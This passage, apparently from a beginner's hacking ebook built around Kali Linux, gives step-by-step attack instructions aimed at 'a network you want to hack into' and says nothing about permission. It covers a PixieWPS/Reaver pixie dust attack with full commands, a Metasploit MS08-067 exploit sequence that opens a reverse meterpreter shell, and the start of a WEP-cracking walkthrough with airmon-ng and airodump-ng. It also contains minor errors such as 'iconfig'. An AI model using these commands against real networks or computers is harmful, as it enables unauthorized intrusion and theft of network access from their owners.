  raw: 'Virtual Box is compatible with just about any operating system, so you shouldn’t
    have any trouble getting it to work with whatever you have. The limits of Virtual
    Box come down to your processing power and memory. You can run as many virtual
    machines inside your device as you have memory for. You can also have as manty
    programs running concurrently from as many operating systems as your device can
    handle.


    If you have not done much hacking before, then Virtual Box is an indispensable
    tool. You can save your computer’s current state to restore it later in case something
    happens. Individuals who try hacking for the first time on their computer often
    make mistakes they wish they could take back. Using a Virtual Box, they actually
    can.


    This tool can be added to your USB drive and work in conjunction with Kali Linux,
    so it’s no problem to take it with you where you need to go.


    ## 7


    # Using PixieWPS with Kali Linux


    The latest versions of Kali Linux already come prepackaged with a program called
    PixieWPS. It works really well with Kali Linux and is an obvious partner for it.


    What PixieWPS does is perform an attack on a network. It guesses the pin number
    or password for the network. This is something that had to be done manually in
    the past, but thanks to PixieWPS it is now automated. This attack, called a pixie
    dust attack, can guess most network passwords in as little as 1 second and as
    much as 30 seconds. How long the process takes will depend on the network’s security.


    The PixieWPS tool actually came into existence out of the Kali Linux forums, so
    it’s entire history has been linked to this distribution.


    If you don’t have PixieWPS on your Kali Linux distribution, then you are probably
    running an older version. You can simply use the following command to get an update
    for that program and start running the current one with PixieWPS included: “apt-get
    update”.


    **Running PixieWPS**


    Generally, PixieWPS works best with Reaver, which is a complementary program that
    aids in the offline network attack. We’re going to assume you have Reaver installed
    with your Kali Linux for this guide.


    In order to obtain Reaver, you can go to GitHub and download it- that is, if you
    don’t already have it. Like PixieWPS, Reaver should already be installed on the
    latest version of Kali Linux. This open source tool uses a brute force approach
    to hacking into a Wi-Fi network. PixieWPS helps refine its approach and ensure
    that it doesn’t take very long to get the desired results- namely, access to the
    network.


    Now, Reaver will sometimes time out or get stuck in a loop. It will just do the
    same thing over and over again. When this happens, you should just let it run.
    It will eventually work itself out. make sure you keep it close to the router
    so it doesn’t have any trouble accessing the network.


    If you feel like the pixie dust attack is taking longer than you would like, you
    can always come back later. Just pause the program with Ctrl+C. This will save
    your progress, and you can come back later and start back right where you left
    off. Sometimes, there are factors that prevent the attack from being completed
    in the usual 30-second timeframe. There may be network problems, compatibility
    issues or other problems that are hindering your progress. Just know that you
    don’t have to perform the entire attack in one go.


    Once you have all the requisite programs on Kali Linux, you can launch a pixie
    dust attack pretty easily. Just put your interface into monitor mode. You do that
    with the command “airmon-ng start”. Then you can start looking for a target. Use
    the command “wash -i” on the monitor interface.


    You will need the BSSID (individualized router number) and channel number of the
    router before you begin the attack. You also want to make sure your signal is
    strong.


    You can launch your attack by entering the command “reaver -i (monitor interface)
    -b (BSSID of the router) -c (the router’s channel number) -vvv -K 1 -f”.


    That should give you the password shortly. This isn’t something that will work
    on every router, but most of them should be susceptible to it. Using PixieWPS
    is almost always more effective than some sort of brute force tactic, and it works
    lots faster.


    ## 8


    # Step-by-Step Guide to Running and Using Kali Linux


    Once you have Kali Linux downloaded and you are near a network you want to hack
    into, you can start the hacking process. Below are a few step-by-step guides on
    how to do it.


    **Basic Hack for Older Windows Systems**


    We’re going to start with a very basic hack that works on many older operating
    systems. It might not be the most practical one, but it’s a good starting hack
    for beginners. With this hack, you can get a good sense of what is involved and
    work up from there.


    1.  Start up Kali Linux and open a new terminal up.


    2.  Then start up Metasploit. This is a program that is already included on Kali
    Linux. It will perform an attack on the network. You can start it up by typing
    in “msfconsole” as a command. This may take a few minutes, so be patient.


    3.  Once Metasploit starts up, you can type in some commands that will progress
    the hack. Here they are in order:


    “use windows/smb/ms08_067_netapi”


    “set PAYLOAD windows/meterpreter/reverse_tcp”


    “set LHOST (your IP address)” [You might not know what your IP address is. You
    can find out by just opening up a new terminal and typing in the command “iconfig”.
    You’ll see your IP address in the output.]


    “set LPORT 4444”


    “set RHOST (the IP of the target network)”


    “set RPORT 445”


    “exploit”


    One you do all that, you should connect. If you aren’t sure what to do or what
    commands are available to you, just type in “help” and a list of commands will
    be displayed.


    1.  Now you are in. You’ve successfully hacked the computer, and you can check
    for network weaknesses or whatever else you need to.


    There is good a chance that this exploit won’t work. If the target network has
    blocked port 445, then you will need to use a different tactic. Also, some newer
    versions of Windows will automatically block this exploit. That’s okay, because
    we have some more methods of hacking for you to use.


    **General WEP Hack**


    This next hack is going to be more useful for current operating systems and networks.
    Here we go:


    1\. Determine the name of the wireless adapter. It is possible that the target
    computer will have multiple networks. If that is the case, then you will have
    to know of the name of the one you want to scan. You are looking for one that
    says “wlan”. If it says “eth” for Ethernet or “lo” for loopback, then it won’t
    be the one we are looking for. To see all the adapters the computer has, type
    in “ifconfig” using a terminal. Just take note of the wlan adapters.


    2\. Turn on monitor mode. You can do that by using the “airmon-ng start wlan0”
    command. The “0” in this command stands for the network you want to hack into.
    Just set the number of the network of your choice in place of that “0”. Typing
    in this command will create a virtual console which is known as a monitor. It
    may be called “mon” on your display.


    If you are using the latest version of Kali Linux, you may see a different name
    for the monitor than just “mon”. It could be “mon0” or “wlan0mon”. Also, the airmon-ng
    command may not work properly for you. If that happens, try using airmon-ng check
    kill. This command looks like this: “airmon-ng <check|check kill>”.


    3\. You can begin capturing packets. This simply means you are intercepting pieces
    of data that are moving across the network connection. You can use the “airodump-ng”
    command to begin the capturing process. This will take data from the packets that
    are moving through the air. When you do that, you will see the name of the target
    network.'
